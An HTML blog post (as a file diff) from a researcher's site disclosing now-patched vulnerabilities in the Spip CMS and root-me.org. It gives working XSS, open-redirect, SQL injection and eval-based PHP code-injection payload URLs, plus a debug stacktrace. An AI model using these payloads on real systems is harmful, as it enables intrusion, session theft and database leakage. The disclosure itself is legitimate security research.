@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.57.2" />
+
+    
+    
+    
+
+<title>RCE on Spip and Root-Me • Think
+Love
+Share</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RCE on Spip and Root-Me"/>
+<meta name="twitter:description" content="Vulnerability research write-up on spip, the web framework used by root-me.org. The issues found goes from XSS to RCE, passing by SQLi!"/>
+
+<meta property="og:title" content="RCE on Spip and Root-Me" />
+<meta property="og:description" content="Vulnerability research write-up on spip, the web framework used by root-me.org. The issues found goes from XSS to RCE, passing by SQLi!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/" />
+<meta property="article:published_time" content="2020-09-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-09-29T00:00:00+00:00" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container sidebar-about ">
+      <span class="site__title">
+        <a href="https://thinkloveshare.com//en">Think
+Love
+Share</a>
+      </span>
+          <a href="https://thinkloveshare.com//en">
+          
+          
+          
+          <div class="author-image">
+            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+      <p class="site__description">
+        <a href="https://thinkloveshare.com//en">
+         InfoSec, Code, Thoughts &amp; Feels 
+      </a>
+      </p>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/hacking/">
+						<span>Hacking</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/coding/">
+						<span>Coding</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/the_rest/">
+						<span>The Rest</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/travels/">
+						<span>Travels</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+  
+</section>
+
+    </p>
+    <p class="copyright">
+      &copy; 2021 Laluka.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>RCE on Spip and Root-Me</h1>
+    
+    
+<div class="post__meta">
+    
+      <i class="fas fa-calendar-alt"></i> Sep 29, 2020
+    
+    
+    <i class="fas fa-clock"></i> 15 min read
+    <i class="fas fa-globe"></i>
+    
+    <a href="#fr">Non traduit</a>
+    
+    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
+</div>
+
+
+  </header>
+  <hr/>
+  <div class="post">
+    
+
+<p>Hi there, <br />
+This article is about Spip, <a href="https://www.root-me.org/">root-me.org</a>, XSS, SQLi, and Remote Code Execution. <br />
+Ever wondered how secure is your daily website ? <br />
+Welcome. To. Php.</p>
+
+<p><img class="img_med" src="/en/hacking/rce_on_spip_and_root_me/sparta_php.jpg" alt="sparta_php"></p>
+
+<h2 id="quick-disclaimer-before-we-start">Quick disclaimer before we start:</h2>
+
+<blockquote>
+<p>In May the 23rd 2020, someone took over an admin account on root-me by password reuse and threatened to leak solutions and flags. There is no beauty in this act, no technical skill required, nor good purpose. This is just part of the &ldquo;be an asshole&rdquo; mindset. More information about this here: <br />
+<a href="https://www.root-me.org/en/breve/Data-theft-password-reuse">https://www.root-me.org/en/breve/Data-theft-password-reuse</a> <br />
+This article and research has no link with this incident <strong>whatsoever</strong>.</p>
+
+<p>This vulnerability research was done locally, and tested only once on root-me.org to have a valid proof of concept before reporting it to the admins. No full dump of the database (solutions, emails, password hashes, &hellip;) has been done, only my personal information and one other user’s entry (he agreed beforehand). Admins and devs from both Spip and root-me were alerted as soon as bugs were found, and reacted with a quick patch process. Every issue has since been patched, and this article is released with their approval.</p>
+</blockquote>
+
+<p>A few weeks ago, I was trying to make my web-audit processes more efficient, and I stood upon two problems:</p>
+
+<ul>
+<li>I tried many crawlers (<a href="https://github.com/s0md3v/Photon">Photon</a>, <a href="https://github.com/hakluke/hakrawler">Hakrawler</a>, <a href="https://portswigger.net/burp">BurpSuite</a>), none gave me the results I expected (false negatives, no js parsing, output format, custom properties, &hellip;)<br /></li>
+<li>Auditing parameter&rsquo;s security one by one is way too slow, and not exhaustive</li>
+</ul>
+
+<p>So I began coding two tools on my free time: &ldquo;Crawlz&rdquo; and &ldquo;Sulfateuse&rdquo;. They attempt to solve both of these issues. They are still under heavy development (basically every night since three weeks) and might be open sourced at some point (not anytime soon, no ask, no cry, keep on reading!).</p>
+
+<p>Once I had a working proof of concept, I wanted to test it against a real life target. I learned so much on root-me, and thus I was expecting the framework they use, <a href="https://www.spip.net/fr_rubrique91.html">Spip</a>, to be secure. I had a quick tour on several CVE websites, and found out that they’ve had a few issues, mostly XSS, LFI, SQLi, and RCE. I thought that this has since been audited roughly, so maybe finding an xss would be a good start.</p>
+
+<p>You know what?</p>
+
+<p><img class="img_med" src="/en/hacking/rce_on_spip_and_root_me/buzz_xss.jpg" alt="buzz_xss"></p>
+
+<h1 id="setup-the-environment">Setup the environment</h1>
+
+<p>First things first, in order to test spip, I&hellip; Needed Spip? <br />
+I tried to find a docker image, or docker compose to have a pre-packaged test environment but found nothing up-to-date, so I made one. A dirty one. We&rsquo;re not in prod, right?</p>
+
+<p>In order to reproduce my setup, you can clone Spip sources, git or svn (see <a href="https://www.spip.net/fr_article2670.html">their recommended way</a>) into the spip directory. Then run <code>docker-compose -f compose-spip.yml up</code> and voila! The only thing left to do is to visit <a href="http://lokal/ecrire">http://lokal/ecrire</a>, create a new account, a dummy category, page, author, etc in order to have some data, and thus be as exhaustive as possible with a populated environment and databases.</p>
+
+<p>Side note here, localhost requests are often made in a way that bypasses proxies. I wanted to log and inspect the traffic, so I added the line <code>127.0.0.1 lokal</code> in <code>/etc/hosts</code> in order to resolve lokal to my loopback address without localhost bypasses in the way.</p>
+
+<p>This docker-compose file contains MySQL as the SQL backend, Adminer to be able to inspect the database easily, and a recent version of Php and its built-in server to run Spip.</p>
+
+<pre><code>version: '3.5'
+
+services:
+  db:
+    image: mysql
+    command: --default-authentication-plugin=mysql_native_password
+    environment:
+        - MYSQL_ROOT_PASSWORD=root
+    ports:
+        - 3306:3306
+
+  adminer:
+    image: adminer
+    ports:
+        - 81:8080
+
+  spip:
+    image: php:7.2
+    ports:
+        - 80:80
+    volumes:
+        - ./spip:/spip
+    working_dir: /spip
+    entrypoint: [&quot;bash&quot;, &quot;-c&quot;, &quot;apt update &amp;&amp; apt install -y default-mysql-client &amp;&amp; docker-php-ext-install mysqli &amp;&amp; php -S 0.0.0.0:80&quot;]
+</code></pre>
+
+<h1 id="crawl-sulfate-repeat">Crawl, Sulfate, Repeat</h1>
+
+<p>Even though &ldquo;a magician never reveals his secrets&rdquo;, here are the core steps of my process:</p>
+
+<ol>
+<li>Start the env, launch burp, chromium (with foxy proxy)</li>
+<li>Navigate on Spip, click on buttons, submit forms, access pages, &hellip;</li>
+<li>From burp, extract every visited url with their parameters</li>
+<li>Run Crawlz, be as exhaustive as possible (keep even false positives and broken urls)</li>
+<li>Triage the urls, remove the odd ones</li>
+<li>Add some magic here <code>¯\_(ツ)_/¯</code></li>
+<li>Run Sulfateuse, (a bit like a custom burp intruder)</li>
+<li>Triage all the results !</li>
+</ol>
+
+<p>One more side note! I used a previous project <a href="https://thinkloveshare.com/en/hacking/wordpress_subpath_auditor/">Wordpress Subpath Auditor</a> to get more insights on Spip and check if some quick-wins were already reachable. I found an eval (powerful primitive for code execution) with partially controlled input, but the sanitization in place (alphanum regex whitelisting) was too restrictive. More on that later!</p>
+
+<p>I still noticed one huge limitation for WoSuAu: As it patches the php code in order to analyze it, dynamically generated files are not instrumented as they are only present after the tool is started. This definitely induces false negatives. Instrumenting php itself would have been more efficient&hellip; One day maybe?</p>
+
+<p>The tests were ran with the builtin php server <code>php -S 0.0.0.0:80</code>. I was too lazy to setup multi-threading, and speed definitely isn&rsquo;t the main concern for Spip folks, nor for me. Sulfateuse ran for approx 10 hours, I slept on it, and the next morning was like one of these christmas day!</p>
+
+<h1 id="triage-the-findings">Triage the findings</h1>
+
+<p>As Sulfateuse tries to be as exhaustive as possible, there are a lot of false positive. This is a pain, but this is the cost of awesome findings. So I’m fine with it! :)</p>
+
+<h2 id="xss">XSS</h2>
+
+<p>TL;DR(XSS): Inject javascript code in a link (reflected) or in a website stored), in a way that once visited, the script is executed on the victim’s browser context, and thus can take actions on their behalf. A common combo can be to generate a link that, once clicked by an admin, will upload a webshell to get code execution (see <a href="https://github.com/Prochainezo/xss2shell">xss2shell</a>), or add a new admin-user on the targetted website with credentials known by the attacker.</p>
+
+<p>A few xss were trivial to find and exploit. Simple or double url-encoded parameters were allowed, thus adding angle brackets was enough to trigger the XSS. Some more complex ones were sanitizing angle brackets, and single or double quotes. Hopefully, breaking an attribute context is often enough to get a working payload!</p>
+
+<h3 id="xss-on-titre">XSS on titre</h3>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=rubriques&amp;titre=pouet&lt;a href=err onfocus=alert(domain) autofocus/&gt;
+http://lokal/ecrire/?exec=rubriques&amp;titre=pouet%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_titre.jpg" alt="xss_titre"></p>
+
+<h3 id="xss-on-label">XSS on label</h3>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=rubriques&amp;label=laluka&lt;a href=err onfocus=alert(domain) autofocus/&gt;
+http://lokal/ecrire/?exec=rubriques&amp;label=laluka%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_label.jpg" alt="xss_label"></p>
+
+<h3 id="xss-on-size-input">XSS on size_input</h3>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=rubriques&amp;size_input=lalu&quot; onfocus=alert(domain) autofocus foo=&quot;
+http://lokal/ecrire/?exec=rubriques&amp;size_input=lalu%22%20onfocus=alert(domain)%20autofocus%20foo=%22
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_size_input.jpg" alt="xss_size_input"></p>
+
+<h3 id="xss-on-sinon">XSS on sinon</h3>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=article&amp;id_article=1&amp;sinon=&lt;a href=err onfocus=alert(domain) autofocus/&gt;
+http://lokal/ecrire/?exec=article&amp;id_article=1&amp;sinon=%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_sinon.jpg" alt="xss_sinon"></p>
+
+<h3 id="xss-on-null">XSS on null</h3>
+
+<p>This one had more restrictions on the angle brackets, so a style trick and woosh!<br />
+The idea here is to have a style to cover the full screen, and execute an action on hover. As soon as the mouse enters the page, it&rsquo;s a win!</p>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=plan&amp;null=lalu' onmouseover=alert(domain) style='width:9999999px;height:9999999px;' foo=
+http://lokal/ecrire/?exec=plan&amp;null=lalu%27%20onmouseover=alert(domain)%20style=%27width:9999999px;height:9999999px;%27%20foo=
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_null.jpg" alt="xss_null"></p>
+
+<h3 id="xss-on-quoi-ie-specific">XSS on quoi (ie-specific)</h3>
+
+<pre><code class="language-html">http://localhost:8000/ecrire/?exec=messages&amp;typem=tout&amp;quoi='/&gt;ie_specific_xss&lt;script&gt;alert(domain)&lt;/script&gt;'
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_quoi_ie.jpg" alt="xss_quoi_ie"></p>
+
+<p>Sometimes, it&rsquo;s more efficient to steal admin&rsquo;s session in order to browse the website while in our own browser. This might not be trivial to achieve as nowadays, session cookies, authentication tokens and such are protected by mitigations like the flags <code>secure</code> and <code>httpOnly</code> (and tons of others, but that not today&rsquo;s story!). <br />
+Here, the quick win was to realize that Spip exposes <code>by default</code> an access to <code>phpinfo()</code> for webmasters. So our xss can, if visited by a webmaster, make that juicy request and get the whole phpinfo output. The best thing here is that it contains information on the system, the current php installation, but also the user&rsquo;s session variables! So any xss found on an install where phpinfo isn&rsquo;t disabled can lead to a direct webmaster session takeover by stealing session cookies and applying them in out own browser. <br />
+Click&rsquo;n&rsquo;Woosh!</p>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/phpinfo_session.jpg" alt="phpinfo_session"></p>
+
+<h3 id="reflected-file-download">Reflected file download</h3>
+
+<p>TL;DR(RFD): You click that link, and a file has been downloaded to your desktop. A common scenario is to send such a link with a second stage as data. Like RFD + SSRF + webshell can achieve a remote code execution. Or even RFD on a whitelisted domain to permit the download of a <a href="https://www.thezdi.com/blog/2020/3/25/cve-2020-0729-remote-code-execution-through-lnk-files">LNK file crafted to get code execution</a>.</p>
+
+<pre><code class="language-html">http://lokal/spip.php?action=converser&amp;redirect=data%253Aimage/svg+xml,content 
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/reflected_file_download.jpg" alt="reflected_file_download"></p>
+
+<h3 id="open-redirect">Open redirect</h3>
+
+<p>TL;DR(OR): This kind of link permits to redirect a browser to another website or protocol. This can be used to bypass forbidden protocols in SSRF, and is also really efficient for phishing attacks. By redirecting the user from a whitelisted domain to a rogue version of the intended website, an attacker can steal the victim’s credentials.</p>
+
+<pre><code class="language-html">https://www.root-me.org/spip.php?action=converser&amp;redirect=https%253A//thinkloveshare.com/ 
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/open_redirect_rootme.jpg" alt="open_redirect_rootme"></p>
+
+<h2 id="sql-injections">SQL injections</h2>
+
+<p>TL;DR(SQLi): Exploit a lack of input sanitization to modify the semantic of an SQL request, or execute another one. This can be exploited to leak the whole database, insert custom data, or even execute code. The technologies vary a lot, so it really depends on the language, software, version, os, context, and the character restriction on this specific injection point.</p>
+
+<p>Here, I tried really hard to exploit an INSERT statement but couldn&rsquo;t find one, only SELECT. I also tried to write to files (webshell) to the filesystem, but MySQL now has a safe by default behavior that kept me from doing so.</p>
+
+<p>Sulfateuse was testing for bad chars, and bad chars include single and double quotes.
+Error logging was enabled, quotes were injected, SQL errors were raised. Amen.</p>
+
+<h3 id="sql-injection-on-where">SQL injection on where</h3>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=accueil&amp;where=SQLI_HERE
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/sqli_where.jpg" alt="sqli_where"></p>
+
+<h3 id="sql-injection-on-lier-trad">SQL injection on lier_trad</h3>
+
+<pre><code class="language-html">http://localhost:8000/ecrire/?exec=article_edit&amp;new=oui&amp;id_rubrique=1&amp;lier_trad=%27
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/sqli_lier_trad.jpg" alt="sqli_lier_trad"></p>
+
+<p>Two backends are supported by Spip: MySQL and SQLite.</p>
+
+<p>Simple sleep in SQLite:</p>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=article_edit&amp;lier_trad=1%2BAND%2B10%3DLIKE%280x41%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--+
+http://lokal/ecrire/?exec=article_edit&amp;lier_trad=1+AND+10=LIKE(0x41,UPPER(HEX(RANDOMBLOB(500000000/2))))-- 
+</code></pre>
+
+<p>Union based in MySQL:</p>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=article_edit&amp;lier_trad=1 AND 1=2 union all select 1,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25;--
+http://lokal/ecrire/?exec=article_edit&amp;lier_trad=1+AND+1%3D2%20union%20all%20select%201,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25;--
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/sqli_lier_trad_poc.jpg" alt="sqli_lier_trad_poc"></p>
+
+<p>Both of these SQL injections can be reached as a webmaster, an administrator, or even an author. Only the visitor role is restricted from accessing the /ecrire panel). This implies that an author can leak password hashes from every user, including admin and webmaster, crack them offline, and takeover highly privileged accounts, and thus either get code execution, or affect other user&rsquo;s.</p>
+
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+
+<p>TL;DR(RCE): Gain code execution on the targeted machine. Aka &ldquo;your computer is now mine&rdquo;. Once this initial foothold is in place, the privilege escalation game begins! Exploit the way up, from &ldquo;a low privileged user&rdquo; to the highest privileges on the machine.</p>
+
+<p>During the third run on Spip (improving Sulfateuse day after day), two new XSS were found.
+The first one is internet-explorer specific as it doesn’t url-encode bad chars by default. Yuck.</p>
+
+<p>You can check how various characters are encoded here: <a href="https://www.worldtimzone.com/res/encode/">https://www.worldtimzone.com/res/encode/</a></p>
+
+<h3 id="xss-on-var-profile-ie-specific">XSS on var_profile (ie-specific)</h3>
+
+<pre><code class="language-html">http://lokal/ecrire/?exec=admin_plugin&amp;var_profile=pouet'/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_var_profile_ie.jpg" alt="xss_var_profile_ie"></p>
+
+<h3 id="xss-on-oups">&ldquo;XSS&rdquo; on _oups</h3>
+
+<p>This one made me laugh because it affected parameter &ldquo;_oups&rdquo;.</p>
+
+<pre><code class="language-html">https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;_oups=pouet'/&gt;&lt;a href=err onfocus=alert(domain) autofocus/&gt;
+https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;_oups=pouet%27/%3E%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_oups.jpg" alt="xss_oups"></p>
+
+<p>As I spent two weeks trying to get code execution via local file inclusion, token leaking via the SQLi, attempts to insert serialized objects in the database, and so on. I eventually gave up, assuming that only XSS and SQLi were present. But the very next day, <a href="https://www.root-me.org/g0uZ">g0uZ</a> (admin at root-me, dev at Spip, what a small world! ) came back to me, explaining that &ldquo;the last XSS you found is a Remote Code Execution&rdquo;. I was a bit pissed, like &ldquo;Come on, I already spent too many nights, I’m done here&rdquo;. But I was not!<br />
+He teased me enough to open burp, start the env, put on my hoodie and inject code!<br />
+A few <code>debug_print_backtrace();</code> and <code>echo &quot;lalu_debug_01&quot;;die();</code> later, I had a (post-auth) Remote Code Execution.</p>
+
+<p>Turns out it was another parameter reflected in the initial eval I was targeting, but this one had no filtering on. Snap! <br />
+This vulnerability can be reached as a webmaster, admin, or author.</p>
+
+<p>The analysis workflow was the following:</p>
+
+<ol>
+<li>Track the &ldquo;_oups&rdquo; parameter, add debug statements</li>
+
+<li><p>Analyse the generated stacktraces, determine that eval is the sink<br />
+I know this is wayyy too small, text version below..
+<img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/stacktrace.jpg" alt="stacktrace"></p>
+
+<pre><code>#0  eval() called at [/issue_4494/ecrire/public/evaluer_page.php:55]
+#1  include(/issue_4494/ecrire/public/evaluer_page.php) called at [/issue_4494/ecrire/public/assembler.php:657]
+#2  evaluer_fond(formulaires/editer_liens, Array ([editable] =&gt;  ,[id] =&gt; auteurs-article-1-auteur,[_vue_liee] =&gt; auteurs_lies,[_vue_ajout] =&gt; auteurs_associer,[_objet_lien] =&gt; auteur,[id_lien_ajoute] =&gt; ,[objet] =&gt; article,[id_objet] =&gt; 1,[objet_source] =&gt; auteur,[table_source] =&gt; auteurs,[recherche] =&gt; ,[visible] =&gt; 0,[ajouter_lien] =&gt; ,[supprimer_lien] =&gt; ,[qualifier_lien] =&gt; ,[ordonner_lien] =&gt; ,[desordonner_liens] =&gt; ,[_roles] =&gt; ,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[_pipelines] =&gt; Array ([formulaire_fond] =&gt; Array ([form] =&gt; editer_liens,[args] =&gt; Array ([0] =&gt; auteurs,[1] =&gt; article,[2] =&gt; 1),[je_suis_poste] =&gt; )),[formulaire_args] =&gt; z+FJ1rTG/lk75IfPcVqrygiJhj3wixKIFYDVzdNWKSfpyNiJtN8gQpPFZh4QRLr2nrCnZYNK061VIxk9YkVVB9TNlAxClgABPC6zutkBCynE3wP7ew8PXA==,[erreurs] =&gt; Array (),[action] =&gt; /ecrire/?exec=article&amp;amp;id_article=1&amp;amp;ajouter=non&amp;amp;tri_liste_aut=statut&amp;amp;deplacer=oui&amp;amp;_oups=%27%3C&amp;amp;php%20debug_print_backtrace%28%29%3Bdie%28%29%3B&amp;amp;%3E%27,[form] =&gt; editer_liens,[lang] =&gt; en), ) called at [/issue_4494/ecrire/inc/utils.php:3258]
+#3  recuperer_fond(formulaires/editer_liens, Array ([editable] =&gt;  ,[id] =&gt; auteurs-article-1-auteur,[_vue_liee] =&gt; auteurs_lies,[_vue_ajout] =&gt; auteurs_associer,[_objet_lien] =&gt; auteur,[id_lien_ajoute] =&gt; ,[objet] =&gt; article,[id_objet] =&gt; 1,[objet_source] =&gt; auteur,[table_source] =&gt; auteurs,[recherche] =&gt; ,[visible] =&gt; 0,[ajouter_lien] =&gt; ,[supprimer_lien] =&gt; ,[qualifier_lien] =&gt; ,[ordonner_lien] =&gt; ,[desordonner_liens] =&gt; ,[_roles] =&gt; ,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[_pipelines] =&gt; Array ([formulaire_fond] =&gt; Array ([form] =&gt; editer_liens,[args] =&gt; Array ([0] =&gt; auteurs,[1] =&gt; article,[2] =&gt; 1),[je_suis_poste] =&gt; )),[formulaire_args] =&gt; z+FJ1rTG/lk75IfPcVqrygiJhj3wixKIFYDVzdNWKSfpyNiJtN8gQpPFZh4QRLr2nrCnZYNK061VIxk9YkVVB9TNlAxClgABPC6zutkBCynE3wP7ew8PXA==,[erreurs] =&gt; Array (),[action] =&gt; /ecrire/?exec=article&amp;amp;id_article=1&amp;amp;ajouter=non&amp;amp;tri_liste_aut=statut&amp;amp;deplacer=oui&amp;amp;_oups=%27%3C&amp;amp;php%20debug_print_backtrace%28%29%3Bdie%28%29%3B&amp;amp;%3E%27,[form] =&gt; editer_liens,[lang] =&gt; en), Array ([trim] =&gt; ,[raw] =&gt; 1,[compil] =&gt; Array ([0] =&gt; ../prive/squelettes/contenu/article.html,[1] =&gt; html_f8c6d633acdd97cfce459c6efd74f49a,[2] =&gt; _article,[3] =&gt; 12,[4] =&gt; en))) called at [/issue_4494/ecrire/public/assembler.php:378]
+#4  inclure_balise_dynamique(Array ([0] =&gt; formulaires/editer_liens,[1] =&gt; 3600,[2] =&gt; Array ([editable] =&gt;  ,[id] =&gt; auteurs-article-1-auteur,[_vue_liee] =&gt; auteurs_lies,[_vue_ajout] =&gt; auteurs_associer,[_objet_lien] =&gt; auteur,[id_lien_ajoute] =&gt; ,[objet] =&gt; article,[id_objet] =&gt; 1,[objet_source] =&gt; auteur,[table_source] =&gt; auteurs,[recherche] =&gt; ,[visible] =&gt; 0,[ajouter_lien] =&gt; ,[supprimer_lien] =&gt; ,[qualifier_lien] =&gt; ,[ordonner_lien] =&gt; ,[desordonner_liens] =&gt; ,[_roles] =&gt; ,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[_pipelines] =&gt; Array ([formulaire_fond] =&gt; Array ([form] =&gt; editer_liens,[args] =&gt; Array ([0] =&gt; auteurs,[1] =&gt; article,[2] =&gt; 1),[je_suis_poste] =&gt; )),[formulaire_args] =&gt; z+FJ1rTG/lk75IfPcVqrygiJhj3wixKIFYDVzdNWKSfpyNiJtN8gQpPFZh4QRLr2nrCnZYNK061VIxk9YkVVB9TNlAxClgABPC6zutkBCynE3wP7ew8PXA==,[erreurs] =&gt; Array (),[action] =&gt; /ecrire/?exec=article&amp;amp;id_article=1&amp;amp;ajouter=non&amp;amp;tri_liste_aut=statut&amp;amp;deplacer=oui&amp;amp;_oups=%27%3C&amp;amp;php%20debug_print_backtrace%28%29%3Bdie%28%29%3B&amp;amp;%3E%27,[form] =&gt; editer_liens)), 1, Array ([0] =&gt; ../prive/squelettes/contenu/article.html,[1] =&gt; html_f8c6d633acdd97cfce459c6efd74f49a,[2] =&gt; _article,[3] =&gt; 12,[4] =&gt; en)) called at [/issue_4494/ecrire/public/assembler.php:353]
+#5  inserer_balise_dynamique(Array ([0] =&gt; formulaires/editer_liens,[1] =&gt; 3600,[2] =&gt; Array ([editable] =&gt;  ,[id] =&gt; auteurs-article-1-auteur,[_vue_liee] =&gt; auteurs_lies,[_vue_ajout] =&gt; auteurs_associer,[_objet_lien] =&gt; auteur,[id_lien_ajoute] =&gt; ,[objet] =&gt; article,[id_objet] =&gt; 1,[objet_source] =&gt; auteur,[table_source] =&gt; auteurs,[recherche] =&gt; ,[visible] =&gt; 0,[ajouter_lien] =&gt; ,[supprimer_lien] =&gt; ,[qualifier_lien] =&gt; ,[ordonner_lien] =&gt; ,[desordonner_liens] =&gt; ,[_roles] =&gt; ,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[_pipelines] =&gt; Array ([formulaire_fond] =&gt; Array ([form] =&gt; editer_liens,[args] =&gt; Array ([0] =&gt; auteurs,[1] =&gt; article,[2] =&gt; 1),[je_suis_poste] =&gt; )),[formulaire_args] =&gt; z+FJ1rTG/lk75IfPcVqrygiJhj3wixKIFYDVzdNWKSfpyNiJtN8gQpPFZh4QRLr2nrCnZYNK061VIxk9YkVVB9TNlAxClgABPC6zutkBCynE3wP7ew8PXA==,[erreurs] =&gt; Array (),[action] =&gt; /ecrire/?exec=article&amp;amp;id_article=1&amp;amp;ajouter=non&amp;amp;tri_liste_aut=statut&amp;amp;deplacer=oui&amp;amp;_oups=%27%3C&amp;amp;php%20debug_print_backtrace%28%29%3Bdie%28%29%3B&amp;amp;%3E%27,[form] =&gt; editer_liens)), Array ([0] =&gt; ../prive/squelettes/contenu/article.html,[1] =&gt; html_f8c6d633acdd97cfce459c6efd74f49a,[2] =&gt; _article,[3] =&gt; 12,[4] =&gt; en)) called at [/issue_4494/ecrire/public/evaluer_page.php(55) : eval()'d code:32]
+#6  eval() called at [/issue_4494/ecrire/public/evaluer_page.php:55]
+#7  include(/issue_4494/ecrire/public/evaluer_page.php) called at [/issue_4494/ecrire/public/assembler.php:657]
+#8  evaluer_fond(prive/squelettes/contenu/article, Array ([exec] =&gt; article,[id_article] =&gt; 1,[ajouter] =&gt; non,[tri_liste_aut] =&gt; statut,[deplacer] =&gt; oui,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[date] =&gt; 2020-05-29 12:34:09,[date_default] =&gt; 1,[date_redac] =&gt; 2020-05-29 12:34:09,[date_redac_default] =&gt; 1,[type-page] =&gt; article,[composition] =&gt; ,[lang] =&gt; en,[espace_prive] =&gt; 1), ) called at [/issue_4494/ecrire/inc/utils.php:3258]
